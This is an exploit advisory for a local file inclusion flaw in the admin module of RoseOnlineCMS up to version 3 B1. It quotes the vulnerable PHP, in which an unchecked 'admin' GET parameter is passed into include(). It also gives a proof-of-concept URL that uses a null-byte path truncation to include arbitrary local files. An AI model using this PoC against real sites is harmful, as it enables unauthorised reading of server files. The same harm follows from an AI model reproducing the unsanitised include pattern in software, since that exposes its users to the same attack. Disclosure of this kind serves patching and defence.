RoseOnlineCMS <= 3 B1 (admin) Local File Inclusion
==================================================

                            \#&#039;#/
                            (-.-)
   --------------------oOO---(_)---OOo-------------------
   | RoseOnlineCMS <= 3 B1 (admin) Local File Inclusion |
   |      (works only with magic_quotes_gpc = off)      |
   ------------------------------------------------------
[!] Discovered: cr4wl3r 
[!] Download: http://sourceforge.net/projects/rosecms/files/
[!] Remote: yes
 
[!] Code :
 
<?PHP
if (isset($_GET[&#039;write&#039;])) {
    $argv = explode(&#039;-&#039;,$_GET[&#039;write&#039;]);
    settype($argv,&#039;array&#039;);
    $_GET[&#039;admin&#039;] = @$argv[0];
    $_GET[&#039;url&#039;] = @$argv[1];
    $_GET[&#039;do&#039;] = @$argv[2];
    $_GET[&#039;key&#039;] = @$argv[3];
}
$admin = !isset($_GET[&#039;admin&#039;]) ? index : $_GET[&#039;admin&#039;] ;
 
   if (is_file("modules/admin/".$admin.".php")) {
        include("modules/admin/".$admin.".php");
     
   } else {
        echo(&#039;Administrator page not found.
                    <br><br> <a href=index.php>Click here to go back home</a>&#039;);
   }
 
ob_end_flush();
?>
 
[!] PoC:
 
    [RoseOnlineCMS_path]/modules/admincp.php?admin=[LFI%00]



